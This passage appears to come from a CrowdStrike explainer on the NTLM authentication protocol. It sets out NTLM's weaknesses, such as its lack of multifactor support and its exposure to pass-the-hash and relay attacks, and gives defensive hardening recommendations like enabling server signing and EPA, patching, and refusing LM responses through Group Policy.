    NTLM is considered an outdated protocol. As such, its benefits — when compared to a more modern solution, such as Kerberos — are limited. Yet the original promise of NTLM remains true: Clients use password hashing to avoid sending unprotected passwords over the network.

    At this point there are several clear disadvantages to relying on NTLM authentication:

    - **Single authentication.** NTLM is a single authentication method. It relies on a challenge-response protocol to establish the user. It does not support [multifactor authentication](https://www.crowdstrike.com/cybersecurity-101/multifactor-authentication-mfa/) (MFA), which is the process of using two or more pieces of information to confirm the identity of the user.

    - **Security vulnerabilities.** The relatively simplistic form of password hashing makes NTLM systems vulnerable to several modes of attacks, including [pass-the-hash](https://www.crowdstrike.com/cybersecurity-101/pass-the-hash/) and [brute-force attacks](https://www.crowdstrike.com/cybersecurity-101/brute-force-attacks/).

    - **Outdated cryptography.** NTLM does not leverage the latest advances in algorithmic thinking or encryption to make passwords more secure.

    ### **How Can You Protect Your Network Using NTLM?**

    Given the known security risks associated with NTLM, CrowdStrike recommends that organizations try to reduce NTLM usage in their network as much as possible.

    For organizations still relying on NTLM for compatibility reasons, CrowdStrike offers the following recommendations to enhance security and minimize risk.

    **Enforce NTLM mitigations.** To be fully protected from NTLM relay attacks, you will need to enable server signing and EPA on all relevant servers.

    **Patch!** Make sure your systems are fully protected with the latest security updates from Microsoft.

    **Use advanced techniques.** Apply advanced NTLM relay detection and prevention techniques similar to the ones disclosed by Preempt (now CrowdStrike) in our Black Hat 2019 talk.

    **Identify weak variations.** Some NTLM clients use weak NTLM variations (e.g., don’t send a MIC). This puts your network at a greater risk of being vulnerable to NTLM relay.

    **Monitor NTLM traffic in your network.** Try to restrict insecure NTLM traffic.

    Get rid of clients sending LM responses and set the Group Policy Object (GPO) network security: LAN Manager authentication level to refuse LM responses.

